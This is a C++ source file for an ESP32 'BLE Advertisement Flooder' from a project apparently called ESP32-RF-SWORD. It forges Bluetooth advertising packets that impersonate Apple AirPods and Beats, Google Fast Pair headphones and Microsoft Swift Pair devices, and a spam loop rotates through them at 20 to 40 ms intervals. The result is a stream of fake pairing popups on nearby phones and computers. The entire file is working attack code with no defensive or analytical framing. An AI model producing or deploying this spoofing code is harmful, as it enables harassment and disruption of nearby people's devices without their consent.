/**
 * @file BLEEngine.cpp
 * @brief ESP32 Native BLE Advertisement Flooder implementation
 * @author ESP32-RF-SWORD Core Team
 * @license MIT
 */

#include "radio/BLEEngine.h"
#include "core/Logger.h"
#include "core/SystemState.h"
#include <string.h>

#ifndef HOST_SIMULATION
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include <esp_bt_main.h>
#include <esp_random.h>
#endif

namespace {

// Apple Continuity Device Models
const uint16_t APPLE_MODELS[] = {
    0x020E, // AirPods Pro
    0x0A20, // AirPods Max
    0x0F20, // AirPods Gen 3
    0x0320, // Powerbeats Pro
    0x0520, // Beats Solo Pro
    0x1020, // Beats Fit Pro
    0x0B20  // Beats Studio Buds
};
constexpr size_t APPLE_MODEL_COUNT = sizeof(APPLE_MODELS) / sizeof(APPLE_MODELS[0]);

// Google Fast Pair Models
const uint32_t FAST_PAIR_MODELS[] = {
    0x000143, // Pixel Buds
    0xF5252A, // Bose NC 700
    0x000000, // Generic Fast Pair
    0x02560F  // JBL Flip 6
};
constexpr size_t FAST_PAIR_COUNT = sizeof(FAST_PAIR_MODELS) / sizeof(FAST_PAIR_MODELS[0]);

#ifndef HOST_SIMULATION
static esp_ble_adv_params_t adv_params = {
    .adv_int_min        = 0x20, // 20ms minimum interval
    .adv_int_max        = 0x40, // 40ms maximum interval
    .adv_type           = ADV_TYPE_IND,
    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
    .peer_addr          = {0},
    .peer_addr_type     = BLE_ADDR_TYPE_PUBLIC,
    .channel_map        = ADV_CHNL_ALL,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};
#endif

} // namespace

BLEEngine& BLEEngine::instance() {
    static BLEEngine s_instance;
    return s_instance;
}

BLEEngine::BLEEngine() {
}

BLEEngine::~BLEEngine() {
    stop();
}

bool BLEEngine::init() {
#ifndef HOST_SIMULATION
    if (!initialized) {
        esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
        esp_bt_controller_init(&bt_cfg);
        esp_bt_controller_enable(ESP_BT_MODE_BLE);
        esp_bluedroid_init();
        esp_bluedroid_enable();
        initialized = true;
        SWORD_LOGS("BLE", "Native BLE advertising engine initialized.");
    }
#else
    initialized = true;
#endif
    return true;
}

void BLEEngine::stop() {
#ifndef HOST_SIMULATION
    if (initialized) {
        esp_ble_gap_stop_advertising();
        esp_bluedroid_disable();
        esp_bluedroid_deinit();
        esp_bt_controller_disable();
        esp_bt_controller_deinit();
        initialized = false;
    }
#endif
}

void BLEEngine::sendApplePopup(uint16_t deviceModel) {
#ifndef HOST_SIMULATION
    if (!initialized) init();

    // Apple Continuity Nearby Action frame (31 bytes max)
    uint8_t packet[31] = {
        0x02, 0x01, 0x06,       // Flags
        0x1B, 0xFF,             // Length: 27 bytes, Manufacturer Specific
        0x4C, 0x00,             // Apple Company ID (0x004C)
        0x0F, 0x05,             // Type: Proximity Pairing / AirDrop
        0xC0,                   // Action Type
        (uint8_t)(deviceModel & 0xFF),
        (uint8_t)((deviceModel >> 8) & 0xFF),
        0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00
    };

    // Randomize auth tag bytes
    for (int i = 13; i < 31; i++) {
        packet[i] = (uint8_t)esp_random();
    }

    esp_ble_gap_config_adv_data_raw(packet, sizeof(packet));
    esp_ble_gap_start_advertising(&adv_params);
    SystemState::instance().recordPackets(0, 1);
#endif
}

void BLEEngine::sendGoogleFastPair(uint32_t modelId) {
#ifndef HOST_SIMULATION
    if (!initialized) init();

    uint8_t packet[14] = {
        0x02, 0x01, 0x06,       // Flags
        0x03, 0x03, 0x2C, 0xFE, // Fast Pair Service UUID (0xFE2C)
        0x06, 0x16, 0x2C, 0xFE, // Service Data
        (uint8_t)((modelId >> 16) & 0xFF),
        (uint8_t)((modelId >> 8) & 0xFF),
        (uint8_t)(modelId & 0xFF)
    };

    esp_ble_gap_config_adv_data_raw(packet, sizeof(packet));
    esp_ble_gap_start_advertising(&adv_params);
    SystemState::instance().recordPackets(0, 1);
#endif
}

void BLEEngine::sendMicrosoftSwiftPair(const char* displayName) {
#ifndef HOST_SIMULATION
    if (!initialized) init();

    size_t nameLen = strlen(displayName);
    if (nameLen > 16) nameLen = 16;

    uint8_t packet[31];
    packet[0] = 0x02; packet[1] = 0x01; packet[2] = 0x06; // Flags
    packet[3] = 0x06; packet[4] = 0xFF; // Microsoft Vendor
    packet[5] = 0x06; packet[6] = 0x00; // Microsoft ID (0x0006)
    packet[7] = 0x03;                   // Swift Pair Beacon Subtype
    packet[8] = 0x00; packet[9] = 0x80; // Display Icon

    packet[10] = (uint8_t)(nameLen + 1);
    packet[11] = 0x09; // Complete Local Name
    memcpy(&packet[12], displayName, nameLen);

    esp_ble_gap_config_adv_data_raw(packet, 12 + nameLen);
    esp_ble_gap_start_advertising(&adv_params);
    SystemState::instance().recordPackets(0, 1);
#endif
}

void BLEEngine::stepSpamCycle() {
    spamCounter++;
    uint8_t type = spamCounter % 3;
    if (type == 0) {
        uint16_t model = APPLE_MODELS[spamCounter % APPLE_MODEL_COUNT];
        sendApplePopup(model);
    } else if (type == 1) {
        uint32_t model = FAST_PAIR_MODELS[spamCounter % FAST_PAIR_COUNT];
        sendGoogleFastPair(model);
    } else {
        sendMicrosoftSwiftPair("Sword Research Hub");
    }
}
